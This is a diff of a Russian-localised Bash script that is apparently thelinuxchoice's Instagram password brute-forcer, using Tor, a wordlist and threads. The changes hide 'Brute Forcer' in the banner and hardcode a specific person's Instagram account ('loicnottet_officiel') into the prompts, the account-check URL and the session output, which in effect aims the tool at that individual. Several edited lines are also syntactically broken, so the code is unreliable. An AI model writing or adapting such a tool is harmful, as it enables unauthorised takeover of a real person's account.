@@ -1,6 +1,7 @@
 #!/bin/bash
 # Coded by: github.com/thelinuxchoice
-# Instagram: @thelinuxchoice
+# Instagram: @loicnottet_officil
+
 
 trap 'store;exit 1' 2
 string4=$(openssl rand -hex 32 | cut -c 1-4)
@@ -50,7 +51,7 @@ banner() {
   printf "\e[1;77m(_/ | || | | ||___ |  | |_ / ___ ||___ || | | || ____|| || |  _____   \e[0m\n"
   printf "\e[1;77m    |_||_| |_|(___/    \__)\_____|(___/ |_| |_||_____) \_)\_)(_____)  \e[0m\n"
   printf "\n"
-  printf "\e[1;77m\e[45m  Instagram Brute Forcer v1.5.4 Author: thelinuxchoice (Github/IG)   \e[0m\n"
+  printf "\e[1;77m\e[45m  Instagram  v1.5.4 Author: thelinuxchoice (Github/IG)   \e[0m\n"
   printf "\e[1;77m\e[45m            RU by XI_shArky_IX (github.com/XIshArkIX)                \e[0m\n"
   printf "\n"
 }
@@ -59,8 +60,8 @@ function start() {
 banner
 checkroot
 dependencies
-read -p $'\e[1;92mИмя аккаунта: \e[0m' user
-checkaccount=$(curl -L -s https://www.instagram.com/$user/?__a=1 | grep -c "страница возможно удалена или не сущетсвует по каким-либо причинам")
+read -p $'\e[1;92m @loicnottet_officil: \e[0m' user
+checkaccount=$(curl -L -s https://instagram.com/loicnottet_officiel/$user/?__a=1 | grep -c "страница возможно удалена или не сущетсвует по каким-либо причинам")
 if [[ "$checkaccount" == 1 ]]; then
 printf "\e[1;91mНеправильное имя аккаунта, попробуй ещё раз.\e[0m\n"
 sleep 1
@@ -128,7 +129,7 @@ function bruteforcer() {
 
 checktor
 count_pass=$(wc -l $wl_pass | cut -d " " -f1)
-printf "\e[1;92mИмя пользователя:\e[0m\e[1;77m %s\e[0m\n" $user
+printf "\e[1;92m@loicnottet_officil:\e[0m\e[1;77m %s\e[0m\n" $user
 printf "\e[1;92mСловарь:\e[0m\e[1;77m %s (%s)\e[0m\n" $wl_pass $count_pass
 printf "\e[1;91m[*] Нажмите Ctrl + C, чтобы остановить или сохранить сессию\n\e[0m"
 token=0
@@ -182,7 +183,7 @@ default_threads=10
 read -p $'\e[1;92mПотоки (Используйте <20 или Enter, чтобы использовать 10): \e[0m' threads
 threads="${threads:-${default_threads}}"
 
-printf "\e[1;92m[*] Продолжаю сессию для:\e[0m \e[1;77m%s\e[0m\n" $user
+printf "\e[1;92m[*] Продолжаю сессию для:\e[0m \e[1;77m%s\e[0m\n" $https://instagram.com/loicnottet_officiel
 printf "\e[1;92m[*] Словарь: \e[0m \e[1;77m%s\e[0m\n" $wl_pass
 printf "\e[1;91m[*] Нажмите Ctrl + C, чтобы остановить или сохранить сессию\n\e[0m"
 
